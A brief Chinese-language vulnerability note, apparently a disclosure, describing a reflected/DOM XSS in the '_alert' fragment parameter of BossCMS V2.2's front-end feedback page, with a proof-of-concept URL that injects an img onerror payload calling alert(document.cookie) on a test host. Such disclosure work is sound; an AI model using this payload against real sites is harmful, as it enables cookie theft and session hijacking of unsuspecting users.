### 源码

地址：<https://www.bosscms.net/download/>

BossCms V2.2

前台的 feedback 功能点

在我成功提交反馈的时候会弹出个提示

~~~~
http://bosscms.test.com/feedback/#_alert=%E5%8F%8D%E9%A6%88%E6%8F%90%E4%BA%A4%E6%88%90%E5%8A%9F%EF%BC%81,green
~~~~

POC

~~~
http://bosscms.test.com/feedback/#_alert="><img src=# onerror=alert(document.cookie)>,green
~~~



![1698385097384](BossCMS_XSS.assets/1698385097384.png)